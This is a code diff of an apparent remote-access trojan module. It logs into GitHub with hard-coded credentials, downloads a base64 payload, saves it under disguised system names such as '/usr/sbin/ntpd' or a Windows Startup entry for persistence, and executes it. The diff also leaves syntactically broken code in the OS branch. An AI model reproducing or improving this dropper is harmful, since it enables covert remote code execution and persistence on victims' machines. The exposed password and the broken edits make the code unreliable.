@@ -10,8 +10,9 @@ filePath = "bin/at-spi2-regd.exe" #"modules/dirlister.py" #
 targetPath = "/usr/sbin/mswin.exe"
 bin = True
 start = True
-scriptExec= "./"
-
+scriptExec= "bash "
+winRunOnBoot=True
+linRunOnBoot=False
 
 def connect_to_github():
 	gh = login(username="MarvenGarsalli",password="1'mfor1am")
@@ -42,11 +43,13 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		targetPath = "/usr/sbin/ntpd"
 	elif os.name == 'nt': #TODO: CHeck win TargetPth
 		filePath = "bin/test" #"modules/dirlister.py" #
-		targetPath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\ms_win32.exe"
+		targetPath = "ms_win32.exe"
+		if winRunOnBoot == True:
+            targetPath = os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup\\"+targetPath
 	else:
-		return ("[ERROR] getFileFromGit: Not recognised OS!")
-	script= get_file_contents(filePath)
+		return ("[ERROR] getFileFromGit: Not recognised OS: %s"%os.name)
 
+	script= get_file_contents(filePath)
 	if script is not None:
 		content	= base64.b64decode(script)
 		if bin:
@@ -59,17 +62,16 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 
 			if start and os.name == 'nt':
 				os.system("start {}".format(targetPath.replace('/','\\')))
-			elif start and os.name == 'posix':
+			else start and os.name == 'posix':
 			    os.system("chmod 777 {}".format(targetPath))
 			    os.system("./{}".format(targetPath))
-			else:
-			    os.system("echo 'Non-recognized OS' >> Tapalog.log")
+
 		else:
 			fich = open(targetPath, "w")
 			fich.write(content.decode())
 			fich.close()
 			if start:
-				os.system(scriptExec+targetPath)
+				os.system(scriptExec+" "+targetPath)
 		return str("getRunScript: file {} successfully started".format(filePath))
 	else:
 		#TODO: Customize log file path
